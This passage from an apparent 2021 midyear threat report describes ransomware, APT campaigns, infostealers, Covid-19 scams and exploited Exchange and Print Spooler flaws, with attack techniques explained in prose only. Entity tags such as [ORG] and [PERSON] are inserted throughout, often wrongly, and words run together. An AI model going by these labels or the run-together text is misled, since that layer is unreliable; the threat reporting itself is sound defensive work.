Enterprise and Government Response to [ORG] Ransomware [ORG] AttacksColonial [ORG] Pipeline reportedly paid US$ 4.4 [MONEY] million in ransom to the [PRODUCT] DarkSide actors . Fortunately , in [DATE] June , [ORG] the [ORG] US [ORG] Department [ORG] of [ORG] Justice announced that it recovered [CARDINAL] 63.7 bitcoins19 of the payment given . Lawenforcement agencies were able to track multiple transfers of bitcoin to a specific address . However , thefull ransom amount was not recovered , and the ransomware group walked away with [CARDINAL] more [CARDINAL] than [CARDINAL] half ofthe payment . It seems that [ORG] Colonial [ORG] Pipeline was prepared for such an incident , since the company had cyber insurancewith Lloyd \u2019s [ORG] of [GPE] London and [ORG] Beazley,20 which covered it for [MONEY] at [MONEY] least US$ [MONEY] 15 [MONEY] million . However , it was unclearif the company used its policy to pay . This is not an unusual scenario : In [DATE] the [DATE] past [DATE] two [DATE] years , we \u2019ve seencompanies involved in ransomware attacks utilize cyber insurance to deal with the ransom payments . In [DATE] 2019 , [ORG] Norsk [ORG] Hydro received US$ 20.2 [MONEY] million21 in cyber insurance from provider [ORG] AIG . In a report oncyber insurance claims made in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021 , insurance company Coalition details22 that 41 % ofreported claims were made as a result of ransomware attacks . Coalition also reports that ransomwareattacks are growing more severe , with the ransom demands affecting policy holders increasing 47 % fromthe [ORDINAL] first to [DATE] the [DATE] second [DATE] quarter of [CARDINAL] 2020.11 | Attacks From All Angles : 2021 Midyear Cybersecurity ReportCyber insurance is supposed to protect enterprises from the fallout of cyberattacks ; however , critics ofthis system argue that insurance encourages ransomware victims to simply pay the ransom and collectinsurance rather than invest in security to deter hackers . On the administrative side , [ORG] the [ORG] US [ORG] Department of the [ORG] Treasury added multiple crimeware gangs to itssanctions program.23 This means that [GPE] US entities and citizens are prohibited from conducting any sort ofbusiness with any of these gangs , including paying them ransom . [ORG] The [ORG] Treasury [ORG] Department \u2019s [ORG] Office [ORG] ofForeign [ORG] Assets [ORG] Control ( OFAC ) issued advisories24 reiterating sanctions risks associated with ransomwarepayments and highlighted that companies facilitating ransomware payments on behalf of a victim mightviolate OFAC regulations . Legislation is also being proposed to create special funds for government ransomware payments . In [ORG] NewYork , under proposed bill S7246,25 state and local taxpayer funds would no longer be used to pay ransomsfor ransomware attacks . Instead , a cybersecurity enhancement fund would be created to distribute grantsand upgrade the cybersecurity of areas with populations of [CARDINAL] a [CARDINAL] million or less . Although organizations hit with ransomware are tempted to simply pay the ransom to recover their data , security and government agencies are generally opposed to this idea for a couple of reasons . [ORDINAL] Firstly , there is no guarantee that the data will or can be returned by ransomware operators , and the data , evenif returned , might also be corrupted . [ORDINAL] Secondly , the money will be used by these criminal gangs for furthermalicious activities . There has also been a historical precedent of ransomware distributors attackingpaying victims again . A [DATE] 2020 security report from [PERSON] Cybereason shows that 80%26 of organizations thatpaid ransom demands experienced a [ORDINAL] second attack . Indeed , ransomware distributors could be markingtheir paying victims as susceptible targets that they can come back to for more ill - gained profits . Ransomware Arrests : Egregor , [PERSON] Clop , [PERSON] EmotetIn [DATE] the [DATE] first [DATE] few [DATE] months [DATE] of [DATE] 2021 , law enforcement agencies across the world successfully dismantled long - running cybercriminal operations and arrested key players in malicious hacking groups . In [DATE] early [DATE] 2021 , law enforcement teams from [GPE] Netherlands , [GPE] Germany , [GPE] the [GPE] United [GPE] States , [GPE] the [GPE] United [GPE] Kingdom , [GPE] France , [GPE] Lithuania , [GPE] Canada , and [GPE] Ukraine coordinated in international activities by [ORG] Europol and [GPE] Eurojustand disrupted one of the most significant and long - running botnets of [DATE] the [DATE] past [DATE] decade , Emotet,27 dubbedby some outlets as the world \u2019s most dangerous malware.28 [ORG] Trend [ORG] Micro was actually the [ORDINAL] first securityservice to discover and profile [PERSON] Emotet in [DATE] 2014 . [PERSON] Emotet evolved from spreading banking trojans to sellingmalware loader services and has victimized over 1.6 million machines.29 [PERSON] Notably , though [PERSON] Emotet is notransomware , it served as a major enabler of ransomware distribution . For example , in [DATE] 2019 , [PERSON] Emotet wasused in a [CARDINAL] two - layered attack30 where it dropped the [PERSON] Trickbot trojan that in turn stole information and [NORP] then12 | Attacks From All Angles : 2021 Midyear Cybersecurity Reportloaded the [ORG] Ryuk ransomware . The danger in [PERSON] Emotet is its resilience and evasion capabilities : It is ableto spread threats laterally on victims \u2019 networks despite only having access to a few devices . Luckily , inJanuary of [DATE] this [DATE] year , law enforcement teams conducted \u201c [FAC] Operation [FAC] Ladybird \u201d and took over its command - and - control ( [ORG] C&C ) infrastructure and arrested key members of the group . In [DATE] March , a joint operation between [NORP] French and [NORP] Ukrainian police saw the arrest of several members of [ORG] theEgregor ransomware cartel in [GPE] Ukraine . The group began operations in [DATE] September [DATE] 2020 and operated ona RaaS business model . They also depended on other cybercriminal groups to orchestrate intrusions intovictim \u2019s networks and deploy ransomware . Victims of this gang were often listed on the Egregor leak siteto shame them into paying the ransom . News reports say that the arrests have made an impact on theEgregor infrastructure , contributing to the shutdown of both [ORG] C&C servers and the leak site . In [DATE] June , members of the [PERSON] Clop ransomware gang were also arrested in [GPE] Ukraine through the efforts of aninternational group . Like Egregor , [PERSON] Clop operates a leak site where , oddly enough , there has been activityeven after the arrests . Aside from ransomware , the gang was also involved in money - laundering activities.13 | Attacks From All Angles : 2021 Midyear Cybersecurity ReportAPTs Find Exploitable Cracks in Online Portals and [PERSON] Webmail [PERSON] ServersAPTs are stealthy campaigns that target specific groups and use advanced methods and malware toinfiltrate and persist in their victims \u2019 systems . The goals differ for each operation , from stealing financialinformation and loading cryptocurrency miners to taking valuable data . In [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021 , [ORG] APT groupscontinued to broaden target bases and update their toolkits , focusing on stealthy infiltration techniquesand finding new ways to abuse legitimate tools and systems to conduct malicious actions . They also continued to search for and exploit vulnerabilities in widely used enterprise tools like [ORG] Kubernetes , AWS cloud servers , and popular email platforms . Meanwhile , spear phishing remains a prevalent andsuccessful way into a victim \u2019s system , despite the fact that attackers have also been using other accessibleentry points like online e - commerce order forms . TeamTNTThe cybercrime group TeamTNT has a reputation for being resourceful , with its loaded arsenal of hackingtools and capabilities . In [DATE] 2020 , the group attacked exposed [PERSON] Docker APIs with an [ORG] XMRig cryptocurrencyminer and created and distributed its own [ORG] IRC ( Internet Relay Chat ) called [PRODUCT] TNTbotinger . In [DATE] March [DATE] 2021 , we found that the group was targeting AWS credentials.31 Upon looking into the serverthat the group used as a repository for their stolen data , we also found Linux cryptocurrency - miningtools that they push onto compromised systems . Later in [DATE] May , we also saw TeamTNT compromisingKubernetes32 clusters in the wild and using them to mine cryptocurrency as well . We elaborate further onTeamTNT activities in our section on threats to the cloud.14 | Attacks From All Angles : 2021 Midyear Cybersecurity ReportWater PamolaWater Pamola is a threat that we have been tracking since [DATE] 2019 . The campaign used spam emails withmalicious attachments on e - commerce shops in [GPE] Japan , [GPE] Australia , and [NORP] European countries . However , ourtelemetry shows that since [DATE] early [DATE] 2020 , [PERSON] Water [PERSON] Pamola started focusing mainly on [GPE] Japan . We also notedthat these newer attacks are not launched via spam . Instead , malicious scripts are executed when theadministrators look into customer orders on their online shop \u2019s administration panel . Further investigations revealed that companies were fielding strange orders on their online portals . JavaScript code had been inserted into the \u201c customer address \u201d or \u201c company name \u201d fields on the orderforms . The script is likely activated by exploiting a cross - site scripting ( [ORG] XSS ) vulnerability in a shop\u2019sadministration portal , and then connects to Water Pamola \u2019s server to download additional payloads . [PERSON] Water [PERSON] Pamola has likely launched this [ORG] embeddedPredictionsXSS script operation on many targeted online shops . If a store administrator opens the malicious order ontheir management panel and their site is vulnerable , the [GPE] XSS attack will be loaded . [CARDINAL] One site victimized byWater Pamola disclosed a data breach and reportedthat customer names , credit card numbers , cardexpiration dates , and credit card security codes werepotentially leaked . This might indicate that the overallgoal of this group is financial and that they are aftercredit card data . [PERSON] Earth [PERSON] Wendigoindustrythat underwentIn our previous security predictions for [DATE] 2021 , we anticipated that organized crime would target the logistics behind e - commerce , growth during the pandemic . As a result of consumers \u2019 increased reliance on online shopping amid lockdowns around the world , we thought it likely that cybercriminals would opt for activities like sabotaging production , transporting fake goods , and trafficking . [ORG] Trend [ORG] Micro discovered an [ORG] APT campaign that has been going on since [DATE] May [DATE] 2019 . It targets governmentorganizations , research institutions , and universities in [GPE] Taiwan . Investigations reveal that the group aimsto exfiltrate emails from targeted organizations by injecting JavaScript backdoors onto a webmail systemthat is widely used in [GPE] Taiwan . The malicious script also appends itself to the victim \u2019s email signature topropagate to other contacts . Since there is no clear connection to any previous attack group , we dubbedthis threat actor as [LOC] Earth Wendigo.33In this attack , a victim will receive a spear - phishing email with an obfuscated malicious [ORG] JavaScriptembedded , which will load malicious scripts from [LOC] Earth [LOC] Wendigo \u2019s remote server . To evade security checks , the email uses the webmail system \u2019s search suggestion function to trigger the webpage to execute themalicious script instead of directly running it.15 | Attacks From All Angles : 2021 Midyear Cybersecurity ReportThe scripts are designed to perform malicious behaviors , including:\u2022 Stealing browser cookies and webmail session keys and sending them to the remote server.\u2022 Appending their malicious script to the victim \u2019s email signature to propagate the infection to thevictim \u2019s contacts.\u2022 Exploiting a webmail system \u2019s [GPE] XSS vulnerability to allow their malicious JavaScript to be injected onthe webmail page permanently.\u2022 [PERSON] Registering a malicious [ORG] JavaScript code to [PERSON] Service [PERSON] Worker , a web browser feature that allowsJavaScript to intercept and manipulate [ORG] HTTPS requests between client and server . The registeredService Worker script can also hijack login credentials and modify the webmail page to add maliciousscripts in case the attackers are unable to inject the [GPE] XSS vulnerability mentioned previously . It shouldbe noted that this is the [ORDINAL] first time that we found an attack at large that leverages [PERSON] Service [PERSON] Worker . At the end of the attack , [PRODUCT] Earth [PRODUCT] Wendigo delivers a JavaScript code that creates a [ORG] WebSocket connectionto a remote server and executes the script returned from the server . The [ORG] WebSocket server instructsthe backdoor on the victim \u2019s browser to read emails from the webmail server and send the content andattachments to the [ORG] WebSocket server . In a separate move from this attack , the threat actor sent malicious emails to other individuals , includingpoliticians and activists who support movements in [GPE] Tibet , the [LOC] Uyghur region , and [GPE] Hong [GPE] Kong . Earth VetalaEarly in [DATE] 2021 , [LOC] Earth [LOC] Vetala \u2013 MuddyWater34 threat actors launched a campaign against organizationsin [GPE] the [GPE] United [GPE] Arab [GPE] Emirates ( [GPE] UAE ) , [GPE] Saudi [GPE] Arabia , [GPE] Israel , and [GPE] Azerbaijan . The sectors that they targetedinclude government agencies , academia , and tourism . The attackers used legitimate remote administration tools ( RATs ) to distribute their malicious payloads , specifically , the applications [ORG] ScreenConnect and [ORG] RemoteUtilities . These tools have broad capabilitiessuch as file and directory browsing , downloading , and uploading files , executing and terminatingprocesses , grabbing screenshots , and others . [PERSON] Earth [PERSON] Vetala created spear - phishing emails with embeddedlinks to a legitimate file - sharing service to distribute archives containing these RATs . After successfullyaccessing the victim , attackers download post - exploitation tools to dump passwords , tunnel their C&Ccommunication using open - source tools , and use additional [ORG] C&C infrastructure to establish a persistentpresence within targeted hosts and environments.16 | Attacks From All Angles : 2021 [ORG] Midyear [ORG] Cybersecurity [ORG] ReportIron TigerIron Tiger is an [ORG] APT threat that has historically targeted gambling and betting companies in [GPE] SoutheastAsia . A recent incident response investigation involving a [NORP] Philippine - based gambling company prompteda closer look at the group , and over [DATE] 18 [DATE] months we found that they expanded their operations and weretargeting governments , banks , telecommunication providers , and even the energy sector in the [LOC] MiddleEast and [LOC] Southeast [LOC] Asia . The group has also updated their toolkit with a [ORG] SysUpdate malware variant that now uses five files in itsinfection routine instead of three.35 The group also uses updated rootkits . [CARDINAL] One of these rootkits is used tohide files at the kernel level and has not previously been associated with this threat actor . The [ORG] SysUpdate malware was typically loaded in memory by a known method involving [CARDINAL] three files . In ourrecent analysis of [ORG] Iron [ORG] Tiger tools , we found [CARDINAL] five tools that the group now uses:\u2022 dlpumgr32.exe , a legitimate signed file that belongs to the [ORG] DESlock+ product\u2022 DLPPREM32.DLL , a malicious [ORG] DLL that is sideloaded by dlpumgr32.exe and that loads and decodesDLPPREM32.bin\u2022 DLPPREM32.bin , a shellcode that decompresses and loads a launcher in memory\u2022 data.res , an encrypted file that is decoded by the launcher and contains [CARDINAL] two [ORG] SysUpdate versions : onefor a 32 [QUANTITY] - bit architecture and another for a [CARDINAL] 64 - bit architecture\u2022config.res , an encrypted file that is decoded by the launcher and contains the [ORG] SysUpdate configuration , including the [ORG] C&C addressIn summary , the launcher acts as an installer : It will copy the malware to a fixed place and ensure that itruns during the next boot of the infected host . The Iron Tiger threat actors have updated their tools , changed their tactics , techniques , and procedures , and expanded their target base . Different active campaigns with versions of the same tools being usedconcurrently suggest that there might be either subgroups for this threat actor or multiple groups withaccess to the builders of these tools . [ORG] PlugXTrend [ORG] Micro \u2019s [ORG] Apex [ORG] One with Endpoint Sensor ( iES ) recently discovered an attacker attempting to exfiltratesensitive information from a company with PlugX loader,36 a remote access tool ( RAT ) used in attackstargeting government organizations and related industries.17 | Attacks From All Angles : 2021 Midyear Cybersecurity ReportInitial analysis of this PlugX variant showed that it has [CARDINAL] three parts : a normal file , a [ORG] DLL loader that thenormal file expects to be present , and an encrypted [ORG] Binary [ORG] Large [ORG] Object ( BLOB ) file containing themalicious code . The normal file loads a seemingly ordinary [ORG] DLL named after a common [ORG] Microsoft [ORG] DLL . However , the hashof the [ORG] DLL does not match any of the known hashes of a normal [ORG] DLL . After reversing the file , we foundthat it was actually PlugX. We observed the process and found that PlugX decrypts , loads , and executesa [ORG] DLL file ( one named after another [ORG] Microsoft [ORG] DLL file ) that is actually an encrypted BLOB.Our investigation shows that the attacker also used other tools during the attack . The simplest way tolaunch these tools is to have the injected code in svchost download , drop , and execute the tools . Wenoted that the attacker had a unique way of launching their malicious tools : They made use of a scheduledtask that runs the batch file which , in turn , executes the tool . Evasion techniques like this , in the larger picture of the security landscape , reify the urgency of relyingon security solutions that can flag anomalous events , correlate them , and associate them with knowntechniques that attackers previously used . With these solutions , companies can look forward to a morecomprehensive view of threats to their systems.18 | Attacks From All Angles : 2021 [EVENT] Midyear [EVENT] Cybersecurity [EVENT] ReportA [EVENT] Look [EVENT] at [EVENT] Upgraded [EVENT] Criminal [EVENT] Campaigns [EVENT] and [EVENT] Unexplored [EVENT] Flaws [EVENT] in [EVENT] Unsecured [EVENT] Technology [EVENT] Active [EVENT] ThreatsAside from ransomware and [ORG] APT threats , [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021 also saw other criminal operations updatingtheir tools and trying new techniques . In particular , we saw malware campaigns targeting vulnerabilitiesin Mac operating systems and web browsers , as well as spam emails spreading an information stealer . Cryptocurrency accounts were also a popular target , as we saw multiple malicious actors trying to collecttrading account information and cryptocurrency wallet details . [GPE] XCESSETXCSSET is a Mac malware that victimizes users by infecting Xcode projects . Although it was initiallyreported as a malware family , it is now classified as an ongoing campaign in light of our recent findings . In [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021 , [GPE] XCSSET quickly trailed [ORG] Apple as the company moved from [ORG] Intel to processorsthat use the ARM64 architecture . It adapted to both ARM64 and [PERSON] x86_x64 [PERSON] Macs and also changed itspayload . Previously , [GPE] XCSSET exploited [CARDINAL] two macOS vulnerabilities , while a [ORDINAL] third exploit was found takingadvantage of browsers in the operating system to implant a universal cross - site scripting ( [ORG] UXSS ) injection . However , new samples that can run on Macs with the new [PRODUCT] M1 chip have been discovered , and theseaffect macOS 11 ( Big Sur ) as well . The malware works by using the development version of [PERSON] Safari to load malicious [PERSON] Safari frameworks andrelated JavaScript backdoors from its [ORG] C&C server . It hosts [PERSON] Safari update packages on the [ORG] C&C server , then downloads and installs packages for the target \u2019s version of the operating system . To adapt to thenewly released [ORG] Big [ORG] Sur , new packages for [PERSON] Safari 14 were added . Fake apps for [ORG] Big [ORG] Sur were also created , with modified icons that are convincingly similar to the legitimate app.19 | Attacks From All Angles : 2021 [ORG] Midyear [ORG] Cybersecurity ReportXCSSET has also been updated to steal confidential data from various websites , [CARDINAL] two of which arecryptocurrency platforms:\u2022163.com\u2022huobi.com\u2022 binance.com\u2022\u2022\u2022nncall.netenvato.comlogin.live.comFor cryptocurrency - trading platform [GPE] Huobi , the malware is not only capable of stealing account informationbut also of replacing the address in a user \u2019s cryptocurrency wallet , a new feature that did not exist in theprevious version . PandaStealerIn [DATE] April , we found a new information stealer called [PERSON] Panda [PERSON] Stealer ( a modified fork of [ORG] Collector Stealer)being delivered mainly to targets in [GPE] the [GPE] United [GPE] States , [GPE] Australia , [GPE] Japan , and [GPE] Germany . [PERSON] Panda [PERSON] Stealer isdeployed using spam emails requesting business quotes ; this pushes victims to open the malicious Excelfile attachments . We identified [CARDINAL] two infection chains in this case : [CARDINAL] One was an [PERSON] XLSM attachment containingmacros that download a loader , which is responsible for downloading and executing the main stealer . Theother infection chain has an [ORG] XLS file containing an [PRODUCT] Excel formula that utilizes a [ORG] PowerShell command toaccess a Pastebin alternative , paste.ee , which in turn accesses a [ORDINAL] second encrypted [ORG] PowerShell command . [PERSON] Panda [PERSON] Stealer also utilizes a fileless approach in its distribution to evade detection . Once installed , [PERSON] Panda [PERSON] Stealer can collect details like private keys and records of past transactions fromits victim \u2019s various digital currency wallets , including Dash , Bytecoin , [ORG] Litecoin , and [ORG] Ethereum . Not onlydoes it target cryptocurrency wallets , it also steals credentials from other applications such as NordVPN , [GPE] Telegram , [ORG] Discord , and [GPE] Steam . It is also capable of taking screenshots of the infected computer andexfiltrating data from browsers like cookies , passwords , and cards . Covid-19 - Related Scams and Fake ProductsWe observed that in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021 , many users were inundated with scams that revolved aroundthe response to Covid-19 or the effects of the pandemic . For example , we found that cybercriminals usedtext messages to lure people into sharing their personal information.37 As further proof of cybercriminals\u2019relentless tendency to exploit any situation , they also lured victims with promises of the vaccine or offersof a stimulus package for unemployed or struggling individuals.20 | Attacks From All Angles : 2021 Midyear Cybersecurity ReportMost of these criminal activities consisted ofphishing and social - engineering plots that tried totake advantage of the constant flux of informationon government pandemic response and newsabout regulations and lockdowns , as evidenced bythe many threats that led to websites dedicated toCovid-19 - focused scams and misinformation . Onthe other hand , some threats led to malicious mobileapplications for vaccine registration or to medicalresponse sites . Malicious apps masqueradingas Covid-19 testing registrations include \u201c V - AlertCOVID-19 \u201d ( detected by [ORG] Trend [ORG] Micro as AndroidOS_Cerberus . HRXC ) and\u201cCovid-19 Test\u201d(detectedby [ORG] Trend [ORG] Micro as Android OS_Anubis . GCL ) . [GPE] Bothof these apps were spotted spreading the bankingmalware [ORG] Anubis and [PERSON] Cerberus . Predictionsthe anticipationAs part of our security predictions for [DATE] 2021 , we foresaw that threat actors would exploit misinformation to lure users into selecting links or downloading attachments . around vaccine development , we predicted that cybercriminals would resort to using the Covid-19 vaccine as a phishing lure . We also anticipated that they would turn to emails , fake apps , malicious domains , and even social media to purportedly offer health information , fake vaccines , and spots on inoculation waitlists.88TikTokFree Laptop ( Students)37Vaccine Register14CoWIN - Helps11Airtel7Cricket Match2Sahaita Gov15 G Converter1Others30100Figure [CARDINAL] 5 . Breakdown of malicious apps associated with Covid-19 . All fake applications here aredetected by [ORG] Trend [ORG] Micro as AndroidOS_FakeApp . NGPF.21 | Attacks From All Angles : 2021 Midyear Cybersecurity ReportSubsequently , some scammers used social media websites and messaging platforms like [ORG] Telegram toprovide fake vaccination cards to individuals who were interested in misrepresenting their vaccinationstatus to bypass regulations and guidelines imposed by authorities . In response , governmentorganizations have been asking vaccinated individuals to refrain from posting pictures of their inoculationcards on social media to avoid forgeries . In a more worrying move , some sellers pushed fake vaccineson e - commerce sites . It is crucial to note that the forgery of vaccination cards , not to mention the sale ofcounterfeit vaccines , shows not only the willingness of some individuals to flout health guidelines but alsothe possibility of a prolonged pandemic and increased lockdowns . We also saw phishing schemes targeting organizations involved in providing vaccinations , frommanufacturers and logistics companies to enterprise customers.38 We tracked malicious files , emails , and pages stealing sensitive information . The targets involved belonged to the telecommunications , banking , retail , government , and finance sectors , and were likely chosen because of their involvement invaccination operations . Our data on overall threats related to Covid-19 shows that there was a [PERCENT] 50 % decrease from [DATE] the [DATE] first [DATE] half [DATE] of2020 [DATE] to [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021 . There are many possible factors that could have contributed to this decline , such as heightened security from both enterprises and users , improved detection and blocking fromonline applications and software vectors , and even a decline in cybercriminal interest in using Covid-19as a topic for lures . We also noted that threats using this topic were found mostly in the [GPE] US and [GPE] Germany . Ultimately , despite the decline , scams that revolve around the pandemic and the vaccine cold chain callfor sustained vigilance , as they can lead not only to the collection of private information but also to theendangerment of lives as the world continues to grapple with [ORG] Covid-19.1H 20208,840,3361H 20214,409,392010MFigure 6 . Comparison of Covid-19 - related email threats , URLs , and malwarein [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2020 and [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 202122 | Attacks From All Angles : 2021 [ORG] Midyear [ORG] Cybersecurity [ORG] ReportUnited [ORG] States 29.2%Figure 7 . The top countries affected by Covid-19 - related threats in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021Unexplored [DATE] Risks [DATE] and [DATE] Unpatched FlawsApart from active malware and criminal campaigns in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021 , we also found unknownvulnerabilities that were not being exploited but still pose risks to users . It is worth emphasizing thatinherent and unintended flaws can sometimes arise when security is not integrated in the development ofapplications and hardware . New and emerging technology also poses a risk to adopters who might notknow the correct security framework that they need to apply when integrating this technology into theirenvironments . SHAREit flawWe discovered several vulnerabilities in the file - sharing and gaming platform SHAREit,39 which hadpreviously been named as one of the most downloaded applications of [DATE] 2019 and which has over [CARDINAL] 1 billiondownloads in Google Play . The app markets itself as a peer - to - peer file - sharing network where users canaccess videos and download games . After analyzing the app and inspecting the vulnerabilities , we [ORDINAL] first noted that the download URLs arenot only from Google Play but also from other vendors . Most of the URLs use the HTTP protocol , whichmakes them vulnerable to tampering by a man - in - the - middle ( MitM ) attacker . The vulnerabilities canalso be abused to leak a user \u2019s sensitive data and execute arbitrary code . They can also potentially leadto RCE . The app allows and promotes the transfer and download of various file types , such as [ORG] AndroidPackage ( APK ) , but the vulnerabilities related to these features are most likely unintended flaws . It shouldbe noted that since publishing our report , SHAREit has fixed these vulnerabilities.23 | Attacks From All Angles : 2021 Midyear Cybersecurity ReportLoRaWANLoRaWAN technology and devices are used in [ORG] IoT systems deployed in enterprises and smart citiesacross the world . This technology can be scattered across large areas and wirelessly connects to theinternet via radio waves . It can also be used in monitoring sensors ( either for weather sensors or trackingsensors ) , asset management , controlled automation , climate control , and more . New research from [ORG] Trend [ORG] Micro brings forward certain exploitable vulnerabilities within these devices andclassifies them as low powered but high risk.40 Our research shows that they are susceptible to denial - of - service ( [NORP] DoS ) attacks , [ORG] ACK spoofing , and bit flipping . We also learned that LoRaWaN is subject to manybugs and vulnerabilities , most of which are memory corruptions . In order to highlight the insecurities inthe LoRaWAN communication environment , we created a tool that we call LoRaPWN.41The fact that LoRaWAN devices are often left exposed in remote areas also leaves them vulnerable tohardware attacks like data scraping , accessing external memory , or abusing open interfaces.42 [GPE] Sensorsacross city blocks and weather nodes in agricultural fields are examples of vulnerable LoRaWAN devicesin remote areas . Lastly , compromised LoRaWAN devices can be used in attacks that could result in stalled operations , leaked data , or falsified information . Since these devices are used in infrastructure and smart city projects , an attack on these could cause physical consequences ; for example , compromising a highway - monitoringsensor could affect motorists by causing an accident or a traffic jam.5 G [ORG] Campus [ORG] NetworksIn our new research into campus networks,43 we looked into risks involved in the development of a4G/5 G campus network for IT and operational technology ( OT ) experts who are tasked with runningand maintaining factories , critical infrastructures , and other such environments . We also tested attackscenarios that were rooted from a compromised campus network and the core network within it . For attacks conducted at the [ORG] IP network , threat actors would [ORDINAL] first need to gain control over a core network\u2019spotential entry points . In our research , we identified these entry points as the server hosting networkservices , the VM or the containers , the network infrastructure , and the base stations . We highlightedseveral attacks that show how a compromised core network can also be an opening for threats thatalready affect industrial control systems ( ICSs ) , such as [ORG] DNS hijacking , [ORG] MQTT hijacking , [ORG] Modbus / [ORG] TCPhijacking , downloading or resetting unprotected programmable logic controllers ( PLCs ) , remote desktop , and [ORG] SIM swapping.24 | Attacks From All Angles : [DATE] 2021 [ORG] Midyear [ORG] Cybersecurity [ORG] ReportOur research also led us to find cellular network - specific attacks . These attacks emphasize how relyingon Access Point Name ( APN ) , which is used for identifying the gateway between the network of a mobiledevice and another network , is not tantamount to having encryption . For better security when on a publicnetwork , a company should rely on its own [ORG] VPN in an industrial router , rather than depend solely on itstelecom provider . The use of [ORG] HTTPS , [ORG] MQTTS , and S7Comm - Plus , which are all secure protocols , is alsorecommended . Given the number and severity of the risks involved , organizations must adapt if they are consideringupdating their infrastructure to include a [CARDINAL] 5 G core network . Based on our research , organizations willneed to consider a new trio of IT , OT , and communications technology ( CT ) to create a better securityframework . VPNFilterCybercriminals continuously target low - hanging fruit , specifically common and unsecured [ORG] IoT devicessuch as routers , printers , and network - attached storage ( [ORG] NAS ) devices . These devices are easy targetsfor many reasons : Users are less likely to patch [NORP] IoT devices , operating systems have no auto - updatefeatures , and manufacturers rarely issue security updates . In [DATE] the [DATE] beginning [DATE] of [DATE] 2021 , we investigated router infections and found that one of the biggest reportedmalware families affecting these devices was [ORG] VPNFilter,44 an [ORG] IoT botnet that was discovered in [DATE] 2018 andthat was active in [DATE] the [DATE] same [DATE] year . The malware is known to compromise routers and storage devices byusing backdoor accounts and exploits of several known vendors . [CARDINAL] VPNFilter operates in [CARDINAL] three stages : initial infection , [ORG] C&C communications , and payload deployment . Since it is an older threat , several mitigation tactics have already been used to essentially defang VPNFilter . In [DATE] 2018 , [ORG] the [ORG] US [ORG] Department [ORG] of [ORG] Justice sinkholed the [ORG] C&C domain ( a move that involves redirecting trafficfrom its original destination ) , compelling the site Photobucket to remove user profile URLs that were beingused to link to malware components . To gather more details about the botnet , we recently partnered with [ORG] the [ORG] Shadowserver [ORG] Foundation , anonprofit security organization . According to [ORG] Shadowserver \u2019s data , the initial spike of [CARDINAL] over [CARDINAL] 14,000 infectednetworks in [DATE] 2018 had been reduced to [CARDINAL] 5,447 . Still , it is likely that these infections will continue to bepresent until these devices are physically swapped out \u2014 a common trend in [ORG] IoT botnets . Indeed , [PERSON] IoTbotnets are to some degree nearly \u201c uncleanable , \u201d and a botnet like this might be taken over by anotherthreat actor for them to use.25 | Attacks From All Angles : 2021 Midyear Cybersecurity ReportWe were able to inject an [ORG] IP address that points back to the sinkhole owned by Shadowserver in order tocheck on the infected devices that are still actively looking for the download server used in the secondstage of the malware operation , and more importantly , to prevent the still - infected networks from movingto the VPNFilter \u2019s next stage in the future . Unfortunately , for threats that affect routers , security solutionsand remedies are not that easy . [ORG] Firmware updates are encouraged , but verifying updates and applyingthem are not as simple as compared with doing so in PC ecosystems . It should also be noted that someusers do n\u2019t have access to their routers to perform upgrades because their vendor or internet serviceprovider ( [ORG] ISP ) provider might be responsible for setting up and updating the machine.26 | Attacks From All Angles : 2021 Midyear Cybersecurity ReportWidely Used and [ORG] Vulnerable [ORG] Technology Actively Attacked Through Critical FlawsIn [DATE] March [DATE] 2021 , [ORG] Microsoft had to manage the mass exploitation of [CARDINAL] four zero [DATE] - day vulnerabilities45 on theon - premises versions of [ORG] Microsoft [ORG] Exchange [ORG] Server , reportedly done by [NORP] Chinese hacking group [GPE] Hafnium . The company released an advisory on the vulnerabilities , but in [DATE] the [DATE] days immediately succeeding theattack , [ORG] Trend [ORG] Micro reported that [CARDINAL] at [CARDINAL] least [CARDINAL] 30,000 organizations might have been attacked in the [GPE] US , [CARDINAL] and63,000 servers remained vulnerable.46These vulnerabilities have collectively been dubbed [FAC] ProxyLogon . Since its discovery and report , it hasbeen exploited by threat actors to distribute the [PERSON] Prometei botnet , the [PERSON] LemonDuck coinminer , as well asransomware families like [ORG] DearCry and [ORG] BlackKingdom . Vulnerable servers were easy targets since majorityof Outlook Web [ORG] App portals are public and indexed by search engines like Google Search , [GPE] Shodan , [ORG] BinaryEdge , [ORG] Censys , [ORG] ZoomEye , and others . According to [GPE] Shodan , on [DATE] March [DATE] 4 , a day after the patch wasreleased , there were [CARDINAL] more [CARDINAL] than [CARDINAL] 266,000 Exchange Servers that were vulnerable to [ORG] ProxyLogon . [PERSON] Print [PERSON] Spooler , a service that runs by default on Windows , also had vulnerabilities that were activelyexploited , presenting another challenge to [ORG] Microsoft . At [ORDINAL] first , [ORG] Microsoft addressed [CARDINAL] one vulnerability , CVE-2021 [ORG] - 1675 , with a security patch released in [DATE] June . Afterward , in [DATE] July , the company released a separate , out - of - band security update for [ORG] PrintNightmare , this time for CVE-2021 [ORG] - 34527 , a critical bug that allowedarbitrary code execution with system privileges . However , a proof - of - concept exploit had already beenreleased accidentally online . A successful attacker could install programs , view , change , or delete data , as well as create new accounts with full user rights . Although [ORG] Microsoft was able to release an advisoryfor CVE-2021 [ORG] - 34527 to fully mitigate the vulnerability , a different bug was reported in mid [DATE] - [DATE] July , this timean escalation - of - privilege ( [ORG] EOP ) vulnerability revealed by researcher [PERSON] Benjamin [PERSON] Delpy.47 [PERSON] Assigned as CVE-2021 [ORG] - 34481 , the vulnerability not only allowed hackers system privileges but also limited access to anetwork.27 | Attacks From All Angles : 2021 Midyear Cybersecurity Report2021 might have started off with significant attacks exploiting critical vulnerabilities , but the number ofoverall reported critical vulnerabilities dipped significantly from [DATE] 2020 . On the other side of the spectrum , numbers for vulnerabilities classified with medium and low severity have risen.600547553 HighMedium121 [CARDINAL] 16 Critical1H 2021 CountFigure 8 . A comparison of the severity breakdown , based on the [ORG] CVSS , of vulnerabilitiesin the first half of [DATE] 2020 and 2021Source : Trend Micro Zero Day Initiative programWindows [CARDINAL] 11On the Windows front , 